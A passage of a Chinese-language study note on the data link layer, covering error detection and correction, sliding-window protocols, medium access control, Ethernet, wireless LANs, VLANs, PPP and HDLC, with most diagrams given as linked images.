id="检错编码">检错编码</span></h2><p><strong>奇偶校验码</strong></p><ol><li>奇校验码就是比特中1的个数为奇数</li><li>偶校验码就是比特中1的个数为偶数</li></ol><blockquote><p>但是这种校验方式如果出现偶数个比特出错就校验不出来了，因为会和原比特流的奇偶性一致。</p></blockquote><p><strong>CRC循环冗余码</strong></p><p>这里有点类似于用除法和余数的关系来检测数据，下面是一个简单的除法来解释crc冗余码的原理</p><p><img src="http://cdn.clown2024.cn/202407151539741.png" alt="image-20240319181343240"></p><p>比如有一个1101的除数，那他的生成多项式就是：</p><p><img src="http://cdn.clown2024.cn/202407151539742.png" alt="image-20240319181544775"></p><p>下面是一个计算FCS的例子：</p><p><img src="http://cdn.clown2024.cn/202407151539743.png" alt="image-20240319181821496"></p><blockquote><p>FCS的生成以及接收端CRC检验都是由硬件实现，处理很迅速因此不会延误数据的传输</p></blockquote><p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输，因为有些帧被丢弃了。</p><h2><span id="纠错编码">纠错编码</span></h2><p>海明码可以发现错误并找到位置，最后纠正错误</p><p><strong>工作流程</strong></p><p><img src="http://cdn.clown2024.cn/202407151539744.png" alt="image-20240319094010233"></p><p><strong>海明距离(码距)</strong></p><p>两个合法编码(码字)的对应比特取值不同的比特数称为这两个码字的海明距离(码距)，一个有效编码集中,任意两个合法编码(码字)的海明距离的最小值称为该编码集的海明距离(码距)。</p><p><img src="http://cdn.clown2024.cn/202407151539745.png" alt="image-20240319174734678"></p><p>比如左边第一个000和001有一个比特位不一样同时也是最小的，所以码距为1，同理右边这个为2；</p><p>所以当码距为d时，要检查出错误的话就只能检测出d-1位，因为如果有d位出错的话可能变成一个正确的编码，这样就无法判断了。</p><p>而想要纠错d位的话就要2d+1码距了。</p><h3><span id="确定校验码位数r">确定校验码位数r</span></h3><p><img src="http://cdn.clown2024.cn/202407151539746.png" alt="image-20240319182311727"></p><h3><span id="确定校验码和数据的位置">确定校验码和数据的位置</span></h3><p><img src="http://cdn.clown2024.cn/202407151539747.png" alt="image-20240319182425486"></p><h3><span id="求出校验码的值">求出校验码的值</span></h3><p><img src="http://cdn.clown2024.cn/202407151539748.png" alt="image-20240319182555883"></p><h3><span id="检错并纠错">检错并纠错</span></h3><p><img src="http://cdn.clown2024.cn/202407151539749.png" alt="image-20240319182901466"></p><p><strong>纠错方法一</strong></p><p><img src="http://cdn.clown2024.cn/202407151539750.png" alt="image-20240319182927374"></p><p><strong>纠错方法二</strong></p><p><img src="http://cdn.clown2024.cn/202407151539751.png" alt="image-20240319182949728"></p><h1><span id="流量控制与可靠传输机制">流量控制与可靠传输机制</span></h1><p>较高的发送速度和较低的接收能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p><p><strong>传输层和链路层流量控制的区别</strong></p><p>数据链路层时点对点的(指两个相邻节点)，传输层是端到端的(指两个主机之间)</p><p>数据链路层流量控制手段:接收方收不下就不回复确认。</p><p>传输层流量控制手段:接收端给发送端一个窗口公告。</p><p><strong>流量控制的方法</strong></p><p><img src="http://cdn.clown2024.cn/202407151539752.png" alt="image-20240320004554062"></p><p>所谓的滑动窗口就是接收方收到数据往后移动一帧，发送方收到确认就往后移动一帧；</p><p>停止-等待协议也可以看做是一个窗口为1的特殊的滑动窗口协议</p><p><img src="http://cdn.clown2024.cn/202407151539753.png" alt="image-20240320004750636"></p><p>数据链路层的滑动窗口在传输过程中都是确定的，而传输层则不一定</p><p><strong>可靠传输、滑动窗口、流量控制</strong></p><p>可靠传输：发送端发啥，接收端收啥</p><p>流量控制：控制发送速率，使接收方有足够的缓冲空间来接收每一个帧。</p><p><img src="http://cdn.clown2024.cn/202407151539754.png" alt="image-20240320005114497"></p><h2><span id="停止等待协议">停止等待协议</span></h2><p><strong>停止等待协议的目的</strong></p><p>除了比特出差错，底层信道还会出现丢包问题。为了实现流量控制。</p><p><strong>前提</strong></p><p>“停止-等待”就是每发送完一个分组就停止发送，等待对方确认，在收到确认后再发送下一个分组。</p><p><strong>应用情况分为两种</strong></p><p>无差错情况&amp;有差错情况</p><h3><span id="无差错情况">无差错情况</span></h3><p><img src="http://cdn.clown2024.cn/202407151539755.png" alt="image-20240321081756032"></p><p>0号帧只是编号一样，两个帧是不一样的</p><h3><span id="有差错情况">有差错情况</span></h3><p><img src="http://cdn.clown2024.cn/202407151539756.png" alt="image-20240321082020356"></p><ol><li><p>发完一个帧后，必须保留它的副本。</p></li><li><p>数据帧和确认帧必须编号。</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151539757.png" alt="image-20240321082242961"></p><p><img src="http://cdn.clown2024.cn/202407151539758.png" alt="image-20240321082347053"></p><p>此时若在收到重传确认0号帧之前收到了之前迟到的确认0号帧，在收到重传确认帧之后也会将其丢弃。</p><h3><span id="信道利用率">信道利用率</span></h3><p><strong>定义</strong></p><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率。</p><p><img src="http://cdn.clown2024.cn/202407151539759.png" alt="image-20240321082926486"></p><p><img src="http://cdn.clown2024.cn/202407151539760.png" alt="image-20240321082757357"></p><p><strong>例题</strong></p><p><img src="http://cdn.clown2024.cn/202407151539761.png" alt="image-20240321083051546"></p><h2><span id="后退n帧协议gbn协议">后退N帧协议(GBN协议)</span></h2><p><strong>后退N帧协议中的滑动窗口</strong></p><p><img src="http://cdn.clown2024.cn/202407151539762.png" alt="image-20240328005017907"></p><p>这里的接收窗口为一，发送窗口有多个</p><p>当发送窗口或者接收窗口确认发送或者接收之后就会向下滑动。</p><p>后退N帧还有一个不同于停止等待的特点就是他可以累计确认，就是不需要每一帧都发送确认，比如在收到3号帧的时候才发送确认帧代表前面都是正常接收到的。</p><p><strong>GBN发送方需要响应的三件事</strong></p><ol><li><p>上层的调用</p><p>上层要发送数据时，发送方先检查发送窗口是否已满，如果未满，则产生一个帧并将其发送；如果窗口己满发送方只需将数据返回给上层，暗示上层窗口己满。上层等一会再发送。(实际实现中，发送方可以缓存这些数据，窗口不满时再发送帧)。</p></li><li><p>收到了一个ACK确认帧</p><p>GBN协议中，对n号帧的确认采用累积确认的方式，标明接收方已经收到n号帧和它之前的全部帧。</p></li><li><p>超时事件</p><p>协议的名字为后退N帧&#x2F;回退N帧，来源于出现丢失和时延过长帧时发送方的行为。就像在停等协议中一样定时器将再次用于恢复数据帧或确认帧的丢失。如果出现超时，发送方重传所有已己发送但未被确认的帧。</p><blockquote><p>比如发送方发送了一个1号帧但是丢失了，后续继续发送2、3、4号帧，但是接收方接收到0号帧之后会等待接收1号帧，但是来的是非1号帧他就会丢弃；所以导致双方都在等待，超过一段时间后发送方就会重传之前1号帧包括1号帧发送之后的数据。</p></blockquote></li></ol><p><strong>GBN接收方需要做的事</strong></p><p> <img src="http://cdn.clown2024.cn/202407151539763.png" alt="image-20240328152503951"></p><p><strong>整个GBN协议的流程图</strong></p><p><img src="http://cdn.clown2024.cn/202407151539764.png" alt="image-20240328152727575"></p><p><strong>滑动窗口的长度</strong></p><p>若采用n比特对帧编号，那么发送窗口的尺寸W，应满足:1≤ W≤2^n-1。因为发送窗口尺寸过大，就会使得接收方无法区别新帧和旧帧。</p><h2><span id="选择重传协议sr">选择重传协议(SR)</span></h2><p><strong>GBN协议的弊端</strong></p><p>由于累计确认的原因，已发送过的帧也要重传就浪费了很多资源。</p><p><strong>解决办法：</strong>设置单个确认，同时加大接收窗口，设置接收缓存，缓存乱序到达的帧。</p><p><strong>这是两个有关SR的滑动窗口例子</strong></p><p><img src="http://cdn.clown2024.cn/202407151539765.png" alt="image-20240331155314314"></p><h3><span id="sr发送方要做的事">SR发送方要做的事</span></h3><ol><li><p>上层的调用<br>从上层收到数据后，SR发送方检查下一个可用于该帧的序号，如果序号位于发送窗口内，则发送数据帧;否则就像GBN一样，要么将数据缓存，要么返回给上层之后再传输。</p></li><li><p>收到了一个ACK<br>如果收到ACK，加入该帧序号在窗口内，则SR发送方将那个被确认的帧标记为已接收。如果该帧序号是窗口的下界(最左边第一个窗口对应的序号)，则窗口向前移动到具有最小序号的未确认帧处。如果窗口移动了并且有序号在窗口内的未发送帧，则发送这些帧。</p><p><img src="http://cdn.clown2024.cn/202407151539766.png" alt="image-20240331155626452"></p></li><li><p>超时事件<br>每个帧都有自己的定时器，一个超时事件发生后只重传一个帧。</p></li></ol><h3><span id="sr接收方要做的事">SR接收方要做的事</span></h3><p>SR接收方将确认一个正确接收的帧而不管其是否按序。失序的帧将被缓存，并返回给发送方一个该帧的确认帧【收谁确认谁】，直到所有(即序号更小的帧)皆被收到为止，这时才可以将一批帧按序交付给上层，然后向前移动滑动窗口。</p><p><img src="http://cdn.clown2024.cn/202407151539767.png" alt="image-20240331155942903"></p><p>如果收到了窗口序号之外的帧，就返回一个ACK，不过这个帧是要小于下界的帧，因为前面的帧都是已经接收过的，可能在发送ACK确认帧的时候丢失了，导致触发了超时重传。</p><h3><span id="运行中的sr的流程图">运行中的SR的流程图</span></h3><p><img src="http://cdn.clown2024.cn/202407151539768.png" alt="image-20240331160353171"></p><p> <strong>窗口长度限制</strong></p><p>窗口长度过长会导致二义性的问题，即接收方无法区分是新帧还是旧帧，发送窗口的大小最好等于接收窗口</p><p><img src="http://cdn.clown2024.cn/202407151539769.png" alt="image-20240331160748621"></p><blockquote><p>n是比特位数</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151539770.png" alt="image-20240331160808971"></p><p><strong>SR协议总结</strong></p><p><img src="http://cdn.clown2024.cn/202407151539771.png" alt="image-20240331161019994"></p><h1><span id="介质访问控制">介质访问控制</span></h1><p><strong>传输数据使用的两种链路</strong></p><ol><li><p>点对点链路：两个相邻节点通过一个链路相连，没有第三者；</p><p>应用：PPP协议，常用于广域网。</p></li><li><p>广播式链路：所有主机共享通信介质；</p><p>应用：早期的总线以太网、无线局域网，常用于局域网</p><p>典型拓扑结构：总线型、星型(逻辑总线型)</p></li></ol><p><strong>介质访问控制</strong></p><p>就是采取一定的措施，使得两对节点之间的通信不会发生互相干扰的情况。</p><p><img src="http://cdn.clown2024.cn/202407151539772.png" alt="image-20240331223817687"></p><blockquote><p>动态分配的特点：信道并非在用户通信时固定分配给用户。</p><p>三种访问控制协议中只有随机访问会发生冲突</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151539773.png" alt="image-20240401001558136"></p><h2><span id="信道划分介质访问控制">信道划分介质访问控制</span></h2><p>使用介质的每个设备与来自同一信道上的其他设备的通信隔离开，把时域和频域资源合理地分配给网络上的设备。</p><p><img src="http://cdn.clown2024.cn/202407151539774.png" alt="image-20240331224034767"></p><h3><span id="fdm">FDM</span></h3><p><strong>频分多路复用</strong></p><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽(频率带宽)资源。</p><p>充分利用传输介质带宽，系统效率较高:由于技术比较成熟，实现也比较容易。</p><p><img src="http://cdn.clown2024.cn/202407151539775.png" alt="image-20240331224236833"></p><h3><span id="tdm">TDM</span></h3><p><strong>时分多路复用</strong></p><p>将时间划分为一段段等长的时分复用帧(TDM帧)。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙，所有用户轮流占用信道。可以提高信道利用率。</p><p><img src="http://cdn.clown2024.cn/202407151539776.png" alt="image-20240331224352471"></p><p><strong>统计时分复用STDM</strong></p><p><img src="http://cdn.clown2024.cn/202407151539777.png" alt="image-20240331224551762"></p><h3><span id="wdm">WDM</span></h3><p><strong>波分多路复用</strong></p><p>波分多路复用就是光的频分多路复用，在一根光纤中传输多种不同波长(频率)的光信号，由于波长(频率)不同，所以各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来。</p><p><img src="http://cdn.clown2024.cn/202407151539778.png" alt="image-20240331224810520"></p><h3><span id="cdm">CDM</span></h3><p><strong>码分多路复用</strong></p><p><img src="http://cdn.clown2024.cn/202407151539779.png" alt="image-20240331225152377"></p><h2><span id="随机访问介质访问控制">随机访问介质访问控制</span></h2><p>所有用户可随机发送信息，发送信息时占全部带宽。</p><h3><span id="aloha协议">ALOHA协议</span></h3><p>该协议分为两种：</p><ol><li>纯ALOHA协议</li><li>时隙ALOHA协议</li></ol><p><strong>纯ALOHA协议</strong></p><p>不监听信道，不按时间槽发送，随机重发。想发就发</p><p><img src="http://cdn.clown2024.cn/202407151539780.png" alt="image-20240331225826465"></p><ul><li>冲突检测：如果发生冲突，接收方在就会检测出差错然后不予确认，发送方在一定时间内收不到就判断发生冲突。</li><li>冲突如何解决：超时后等一随机时间再重传。</li></ul><p><strong>时隙ALOHA协议</strong></p><p>时隙ALOHA协议的思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道若发生冲突，则必须等到下一个时间片开始时刻再发送。</p><p><img src="http://cdn.clown2024.cn/202407151539781.png" alt="image-20240331230108274"></p><ol><li>纯ALOHA比时隙ALOHA吞吐量更低，效率更低。</li><li>纯ALOHA想发就发，时隙ALOHA只有在时间片段开始时才能发。</li></ol><h3><span id="csma协议">CSMA协议</span></h3><p>即叫做载波监听多路访问协议CSMA(carrier sense multiple access)</p><ul><li><p><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。</p><blockquote><p>当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大(互相叠加)。当一个站检测到的信号电压摆动值超过一定门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞，即发生了冲突。</p></blockquote></li><li><p><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151539782.png" alt="image-20240331232412543"></p><ol><li><p><strong>1-坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道。<br>空闲则直接传输，不必等待。<br>忙则一直监听，直到空闲马上传输。<br>如果有冲突(一段时间内未收到肯定回复)，则等待一个随机长的时间再监听，重复上述过程。</p><p>优点：只要媒体空闲，站点就马上发送，避免了媒体利用率的损失。<br>缺点：假如有两个或两个以上的站点有数据要发送，冲突就不可避免。</p></li><li><p><strong>非坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道空闲则直接传输，不必等待。忙则等待一个随机的时间之后再进行监听。</p><p>优点：采用随机的重发延迟时间可以减少冲突发生的可能性。</p><p>缺点：可能存在大家都在延迟等待过程中，使得媒体仍可能处于空闲状态，媒体使用率降低</p></li><li><p><strong>p-坚持CSMA协议</strong>：p-坚持指的是对于监听信道空闲的处理</p><p>如果一个主机要发送消息，那么它先监听信道</p><p>空闲则以p概率直接传输，不必等待；概率1-p等待到下一个时间槽再传输。</p><p>忙则持续监听直到信道空闲再以p概率发送。</p><p>若冲突则等到下一个时间槽开始再监听并重复上述过程。</p><p>优点：既能像非坚持算法那样减少冲突，又能像1-坚持算法那样减少媒体空闲时间的这种方案</p><p>缺点：发生冲突后还是要坚持把数据帧发送完，造成了浪费。</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151539784.png" alt="image-20240331233405613"></p><h3><span id="csmax2fcd协议">CSMA&#x2F;CD协议</span></h3><p>载波监听多点接入&#x2F;碰撞检测CSMA&#x2F;CD(carrier sense multiple access with collision detection)</p><ul><li><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前以及发送数据时都要检测一下总线上是否有其他计算机在发送数据。和上面的相比多了一个发送时监听。</li><li><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。总线型网络。</li><li><strong>CD</strong>：碰撞检测(冲突检测)，“边发送边监听，适配器边发送数据边检测信道上信号电压的变化情况，以便判断自己在发送数据时其他站是否也在发送数据。说明用于半双工网络。</li></ul><p><strong>传播时延对载波监听的影响</strong></p><p><img src="http://cdn.clown2024.cn/202407151539785.png" alt="image-20240331234826159"></p><p><strong>碰撞后的重传机制</strong></p><p>使用截断二进制指数规避算法</p><p><img src="http://cdn.clown2024.cn/202407151539786.png" alt="image-20240331235336764"></p><p><strong>最小帧长问题</strong></p><p>因为该协议就是为了即使控制帧的传输，如果帧已经发完了就没有控制的意义了，所以会规定一个最小帧长以便在帧发送完之前可以检测到冲突并及时控制传输。</p><p><img src="http://cdn.clown2024.cn/202407151539787.png" alt="image-20240331235646524"></p><blockquote><p>以太网规定的最短帧长为64B，所以长度小于64B的都是由于冲突而异常终止的无效帧。</p></blockquote><h3><span id="cdmax2fca协议">CDMA&#x2F;CA协议</span></h3><p>载波监听多点接入&#x2F;碰撞避免CSMA&#x2F;CA(carrier sense multiple access with collision avoidance)</p><p><img src="http://cdn.clown2024.cn/202407151539788.png" alt="image-20240401000102318"></p><p><strong>工作原理</strong></p><ol><li>发送数据前，先检测信道是否空闲</li><li>空闲则发出RTS(request to send)，RTS包括发射端的地址、接收端的地址、下一份数据将持续发送的时间等信息;信道忙则等待。</li><li>接收端收到RTS后，将响应CTS(clear tosend)</li><li>发送端收到CTS后，开始发送数据帧(同时预约信道:发送方告知其他站点自己要传多久数据)。</li><li>接收端收到数据帧后，将用CRC来检验数据是否正确，正确则响应ACK帧。</li><li>发送方收到ACK就可以进行下一个数据帧的发送，若没有则一直重传至规定重发次数为止(采用二进制指数退避算法来确定随机的推迟时间)。</li></ol><blockquote><p>RTS&#x2F;CTS是可选的的，主要用于解决隐蔽站的问题，但是一定要成对出现。</p></blockquote><h3><span id="cd和ca的对比">CD和CA的对比</span></h3><p><strong>相同点：</strong><br>CSMA&#x2F;CD与CSMA&#x2F;CA机制都从属于CSMA的思路，其核心是先听再说。换言之，两个在接入信道之前都须要进行监听。当发现信道空闲后，才能进行接入。<br><strong>不同点：</strong></p><ol><li>传输介质不同:CSMA&#x2F;CD用于总线式以太网【有线】，而CSMACA用于无线局域网【无线】</li><li>载波检测方式不同:因传输介质不同，CSMA&#x2F;CD与CSMA&#x2F;CA的检测方式也不同。CSMA&#x2F;CD通过电缆中电压的变化来检测，当数据发生碰撞时，电缆中的电压就会随着发生变化；而CSMA&#x2F;CA采用能量检测(ED)、载波检测(CS)和能量载波混合检测三种检测信道空闲的方式。</li><li>CSMA&#x2F;CD检测冲突，CSMA&#x2F;CA避免冲突，二者出现冲突后都会进行有上限的重传。</li></ol><h2><span id="轮询访问介质访问控制">轮询访问介质访问控制</span></h2><h3><span id="轮询协议">轮询协议</span></h3><p>主结点轮流”邀请”从属结点发送数据，也就是轮询发送一个短的询问帧看从属结点是否要发送数据</p><p><img src="http://cdn.clown2024.cn/202407151539789.png" alt="image-20240401002015624"></p><p>不过会带来一些问题：</p><ol><li>轮询开销</li><li>等待延迟</li><li>单点故障</li></ol><h3><span id="令牌传递协议">令牌传递协议</span></h3><p><strong>令牌</strong>：一个特殊格式的MAC控制帧，不含任何协议</p><p>令牌用于控制信道的使用，确保同一时刻只有一个结点独占信道。</p><p><img src="http://cdn.clown2024.cn/202407151539790.png" alt="image-20240401002623143"></p><blockquote><p>工作流程大概如下：</p><p>假设D要给A发送数据，D持有令牌之后修改控制帧表示已经使用，然后在令牌后面带上数据构成数据帧，然后该数据帧就在令牌环中进行传递，当传到主机A的时候发现是发送给自己的就复制这一份数据，然后令牌传给D；D再检查自己的数据有没有出现问题需不需要重传，确认完毕之后就回收数据，再还原令牌的控制帧然后将令牌继续传递。</p></blockquote><p>每个结点都可以在一定时间内(令牌持有时间)获得发送数据的权利，并不是无限制的持有令牌；如果发送数据过大在一个令牌时间内无法发送完就需要分次发送，等待下一次令牌传递。</p><p><strong>该协议也会产生一些问题</strong></p><ol><li>令牌开销</li><li>等待延迟</li><li>单点故障</li></ol><blockquote><p>该协议应用于令牌环网（物理星型拓扑，逻辑环形拓扑）</p><p>该方式常用于负载较重、通信量较大的网络中，因为如果较为空闲的网络中，令牌可能会一直传递但没有使用造成浪费。</p></blockquote><h1><span id="局域网">局域网</span></h1><p>局域网(Local Area Network):简称LAN，是指在某一区域内由多台计算机互联成的计算机组，使用广播信道</p><ul><li>特点1:覆盖的地理范围较小，只在一个相对独立的局部范围内联，如一座或集中的建筑群内。</li><li>特点2:1使用专门铺设的传输介质(双绞线、同轴电缆)进行联网，数据传输速率高(10Mb&#x2F;s~10Gb&#x2F;s)</li><li>特点3:通信延迟时间短，误码率低，可靠性较高。</li><li>特点4:各站为平等关系，共享传输信道。</li><li>特点5:多采用分布式控制和广播式通信，能进行广播和组播，</li></ul><p>决定局域网的主要要素为：网络拓扑、传输介质和介质访问控制方法</p><h2><span id="局域网拓扑结构">局域网拓扑结构</span></h2><p><img src="http://cdn.clown2024.cn/202407151539791.png" alt="image-20240401215100579"></p><p>综上可以知道总线型的拓扑结构是比较好的，现在比较常用的也是总线型拓扑。</p><h2><span id="局域网传输介质">局域网传输介质</span></h2><ul><li>有线局域网：双绞线、同轴电缆、光纤</li><li>无线局域网：电磁波</li></ul><h2><span id="局域网介质访问控制方法">局域网介质访问控制方法</span></h2><ol><li><p>CSMA&#x2F;CD：常用于总线型局域网，也用于树型网络</p></li><li><p>令牌总线：常用于总线型局域网，也用于树型网络</p><p>它是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环。只有令牌持有者才能控制总线，才有发送信息的权力。</p></li><li><p>令牌环：用于环形局域网，如令牌环网</p></li></ol><h2><span id="局域网的分类">局域网的分类</span></h2><p><img src="http://cdn.clown2024.cn/202407151539792.png" alt="image-20240401215625251"></p><h2><span id="ieee-802标准">IEEE 802标准</span></h2><p>IEEE 802系列标准是IEEE 802 LAN&#x2F;MAN 标准委员会制定的局域网、城域网技术标准(1980年2月成立)。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p><p><strong>下面是一些802的版本</strong></p><p><img src="http://cdn.clown2024.cn/202407151539793.png" alt="image-20240401215941515"></p><h2><span id="mac子层和llc子层">MAC子层和LLC子层</span></h2><p>IEEE802标准所描述的局域网参考模型只对应OSI参考模型的数据链路层与物理层，它将数据链路层划分为逻辑链路层LLC子层和介质访问控制MAC子层。</p><p><img src="http://cdn.clown2024.cn/202407151539794.png" alt="image-20240401220205402"></p><h1><span id="以太网">以太网</span></h1><p>以太网(Ethernet)指的是由Xerox公司创建并由Xerox、Intel和DEC公司联合开发的基带总线局域网规范，是当今现有局域网采用的最通用的通信协议标准。以太网络使用CSMA&#x2F;CD(载波监听多路访问及冲突检测)技术。</p><p><strong>以太网十分常用的原因</strong></p><ol><li>造价低廉</li><li>是应用最广泛的局域网技术</li><li>比令牌环网、ATM网便宜，简单</li><li>满足网络速率要求：10Mb&#x2F;s~10Gb&#x2F;s</li></ol><p><strong>以太网的两个标准</strong></p><ul><li>DIX Ethernet V2:第一个局域网产品(以太网)规约。</li><li>IEEE 802.3:IEEE 802委员会802.3工作组制定的第一个IEEE的以太网标准。(帧格式有一丢丢改动)</li></ul><h2><span id="以太网提供无连接-不可靠的服务">以太网提供无连接、不可靠的服务</span></h2><p>无连接：发送方和接收方之间无””握手过程”<br>不可靠：不对发送方的数据帧编号，接收方不向发送方进行确认，差错帧直接丢弃，差错纠正由高层负责。</p><blockquote><p>以太网只实现无差错接收，不实行可靠传输</p></blockquote><h2><span id="以太网传输介质和拓扑结构发展">以太网传输介质和拓扑结构发展</span></h2><p><img src="http://cdn.clown2024.cn/202407151539795.png" alt="image-20240401221233925"></p><h2><span id="10base-t以太网">10BASE-T以太网</span></h2><p><img src="http://cdn.clown2024.cn/202407151539796.png" alt="image-20240401221436733"></p><h2><span id="适配器与mac地址">适配器与MAC地址</span></h2><p>计算机与外界有局域网的连接是通过通信适配器的。</p><p><img src="http://cdn.clown2024.cn/202407151539797.png" alt="image-20240401221549243"></p><p>MAC地址又称为物理地址，是全球唯一的，每个网卡都有MAC地址。</p><p>MAC地址是由48位二进制数组成，前24位代表厂家(由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8e-e4-b1-21</p><h2><span id="以太网mac帧">以太网MAC帧</span></h2><p>最常用的MAC帧是以太网V2的格式</p><p><img src="http://cdn.clown2024.cn/202407151539798.png" alt="image-20240401222333972"></p><blockquote><p>以太网的最小帧长位64B</p></blockquote><p>与IEEE 802.3的区别：</p><ol><li>第三个字段是长度&#x2F;类型</li><li>当长度&#x2F;类型字段值小于0x0600时，数据字段必须装入LLC子层</li></ol><h2><span id="高速以太网">高速以太网</span></h2><p><img src="http://cdn.clown2024.cn/202407151539799.png" alt="image-20240401222630966"></p><h1><span id="无线局域网">无线局域网</span></h1><p>IEEE 802.11是无线局域网的通用标准。</p><p>它还有很多细分的版本如下：</p><p><img src="http://cdn.clown2024.cn/202407151539800.png" alt="image-20240401222817167"></p><h2><span id="80211的mac帧头格式">802.11的MAC帧头格式</span></h2><p><img src="http://cdn.clown2024.cn/202407151539801.png" alt="image-20240401223149510"></p><p>上面的只是其中一种，802.11不同的版本还有不同的帧头格式</p><p><img src="http://cdn.clown2024.cn/202407151539802.png" alt="image-20240401223240972"></p><h2><span id="无线局域网分类">无线局域网分类</span></h2><p><strong>有固定基础设施的无线局域网</strong></p><p><img src="http://cdn.clown2024.cn/202407151539803.png" alt="image-20240401223632641"></p><p>wifi的名称又叫做服务集标识符。</p><p><strong>无固定基础设施无线局域网的自组织网络</strong></p><p><img src="http://cdn.clown2024.cn/202407151539804.png" alt="image-20240401223748731"></p><p>即每个主机又可以当作主机又可以当作路由器转发数据。</p><h1><span id="vlan">VLAN</span></h1><p>就是虚拟局域网(Virtual Local Area Network)，是一种将局域网的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组有某些共同的需求。每个VLAN是一个单独的广播域&#x2F;不同的子网。</p><p><img src="http://cdn.clown2024.cn/202407151539805.png" alt="image-20240401224352375"></p><blockquote><p>虚拟网络建立在网络交换机之上，它以软件方式来实现逻辑工作组的划分与管理</p></blockquote><h2><span id="vlan的实现">VLAN的实现</span></h2><p>交换机上生成的VLAN互不想通，若想实现通信，需要借助：</p><ul><li>路由器</li><li>三层交换机</li></ul><p><strong>基于接口的VLAN技术</strong></p><p><img src="http://cdn.clown2024.cn/202407151539806.png" alt="image-20240401225024038"></p><p><img src="http://cdn.clown2024.cn/202407151539807.png" alt="image-20240401225037903"></p><p>A发送一个广播帧可以不让B收到，其原理如下：</p><blockquote><p>A发送一个广播请求，交换机取转发表中对照知道他是来自1号端口，知道他是来自VLAN1的广播请求，然后却交换机的VLAN表中查看，VLAN ID中为1的只有2号端口所以会转发给B而不会转发给C和D</p></blockquote><p><strong>基于MAC地址的VLAN技术</strong></p><p><img src="http://cdn.clown2024.cn/202407151539808.png" alt="image-20240401225544853"></p><p>就是改变了一下交换机的VLAN表的形式，对应还是一样的。</p><p><strong>交换机之间的通信</strong></p><p><img src="http://cdn.clown2024.cn/202407151539809.png" alt="image-20240401225719073"></p><p>比如A要给E发送数据，然后给数据标记上VLAN1的标签，当发送到交换机2的时候就知道它是属于哪一个网络的，然后就可以发送给E了。</p><p><strong>IEEE 802.1Q帧</strong></p><p><img src="http://cdn.clown2024.cn/202407151539810.png" alt="image-20240401230123145"></p><h1><span id="广域网及相关协议">广域网及相关协议</span></h1><p>广域网(WAN，WideArea Network)，通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个城市或国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。</p><p>广域网的通信子网主要使用分组交换技术。广域网的通信子网可以利用公用分组交换网、卫星通信网和无线分组交换网，它将分布在不同地区的局域网或计算机系统互连起来，达到资源共享的目的。如因特网(Internet)是世界范围内最大的广域网。</p><p><img src="http://cdn.clown2024.cn/202407151539811.png" alt="image-20240401230819221"></p><h2><span id="ppp协议">PPP协议</span></h2><p>点对点协议PPP(Point-to-Point Protocol)是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都使用PPP协议。</p><blockquote><p>该协议只支持全双工通信</p></blockquote><p><strong>PPP协议应满足的要求</strong></p><p><img src="http://cdn.clown2024.cn/202407151539812.png" alt="image-20240401231218835"></p><p><strong>PPP协议无需满足的要求</strong></p><p><img src="http://cdn.clown2024.cn/202407151539813.png" alt="image-20240401231255188"></p><p><strong>PPP协议的三个组成部分</strong></p><p><img src="http://cdn.clown2024.cn/202407151539814.png" alt="image-20240401231415652"></p><p><strong>PPP协议的状态图</strong></p><p><img src="http://cdn.clown2024.cn/202407151539815.png" alt="image-20240401231530196"></p><p><strong>PPP协议的帧格式</strong></p><p><img src="http://cdn.clown2024.cn/202407151539816.png" alt="image-20240401231652471"></p><blockquote><p>PPP协议是一个面向字节的协议</p></blockquote><h2><span id="hdlc协议">HDLC协议</span></h2><p>高级数据链路控制(High-Level Data Link ControI或简称HDLC)，是一个在同步网上传输数据、面向比特的数据链路层协议，它是由国际标准化组织(ISO)根据IBM公司的SDLC(SvnchronousData Link Control)协议扩展开发而成的。</p><p>数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现</p><p>HDLC协议采用全双工通信。</p><p>所有帧采用CRC检验，对信息帧进行顺序编码，可防止漏收或重份，传输可靠性高。</p><p><strong>HDLC的站</strong></p><p><img src="http://cdn.clown2024.cn/202407151539817.png" alt="image-20240401232456669"></p><p><strong>HDLC的帧格式</strong></p><p><img src="http://cdn.clown2024.cn/202407151539818.png" alt="image-20240401232617385"></p><h2><span id="ppp协议和hdlc协议的区别">PPP协议和HDLC协议的区别</span></h2><p><img src="http://cdn.clown2024.cn/202407151539819.png" alt="image-20240401232742381"></p><h1><span id="链路层设备">链路层设备</span></h1><h2><span id="物理层扩展以太网">物理层扩展以太网</span></h2><p>用来减少信号的衰减，因为一台主机连上集线器的端口之后距离不能太远，不然信号失真非常严重</p><ol><li><p>使用光纤解调器来扩展以太网</p><p><img src="http://cdn.clown2024.cn/202407151539820.png" 